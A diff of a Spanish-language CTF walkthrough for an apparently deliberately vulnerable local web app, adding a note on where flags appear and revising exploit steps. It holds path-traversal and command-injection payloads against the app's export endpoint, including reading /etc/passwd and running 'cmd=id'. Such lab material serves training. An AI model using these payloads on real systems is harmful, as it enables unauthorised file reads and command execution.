@@ -31,6 +31,8 @@ JWT=$(curl -s -X POST http://localhost:5000/api/auth/login \
 
 > **¿Prefieres Burp Suite?** Aquí el fuerte es **Repeater** para inyecciones: pega el payload, asegúrate de **URL-encodear** en query strings (`Ctrl+U`), y usa el tab **Inspector** para ver el valor decodificado al iterar. Para los uploads, `Proxy → Intercept` y edita el `filename`. Config en el **Anexo 7** del `README.md`.
 
+> **¿Dónde está la flag?** Al completar un reto, la bandera ya viene **en la propia respuesta HTTP**: respuestas JSON con los campos `flag` (única) y `flags` (lista); respuestas no-JSON (HTML/SSE/archivos/redirects) con la cabecera `X-Flag`/`X-Flags`. Detalle en la sección 4 del `README.md`.
+
 ---
 
 ## R13 — SQL Injection en búsqueda de usuarios
@@ -213,15 +215,13 @@ JWT=$(curl -s -X POST http://localhost:5000/api/auth/login \
    curl -s "http://localhost:5000/transactions/export?filename=../../etc/passwd" | head -3
    ```
 2. RCE combinando un archivo que exista + `cmd`:
-   ```bash
-   curl -s "http://localhost:5000/transactions/export?filename=test.csv?cmd=id&runner=bash"
-   ```
-   > Nota: `filename` debe apuntar a un archivo **existente** bajo el dir de export (`uploads/`). Sube primero un archivo (R17) y luego úsalo como `filename` para ejecutar `cmd`.
+   > `filename` debe apuntar a un archivo **existente** bajo el dir de export (`uploads/`). Sube primero un archivo (R17) y luego úsalo como `filename` para ejecutar `cmd`:
    ```bash
    curl -s -X POST http://localhost:5000/api/upload -H "Authorization: Bearer $JWT" \
      -F "file=@/tmp/a.txt"
    curl -s "http://localhost:5000/transactions/export?filename=a.txt?cmd=id&runner=bash"
    ```
+3. (Variante) Si ya tienes subido un `test.csv` en `uploads/`, la misma sintaxis con `filename=test.csv?cmd=id&runner=bash` ejecuta `cmd` igualmente — el `?` del payload va dentro del query string, sin necesidad de codificar nada.
 
 **Prueba de éxito**: `GET /transactions/export?filename=../../etc/passwd` devuelve el contenido de `/etc/passwd` **sin auth**; con `cmd=id` responde la salida de `id`.
 
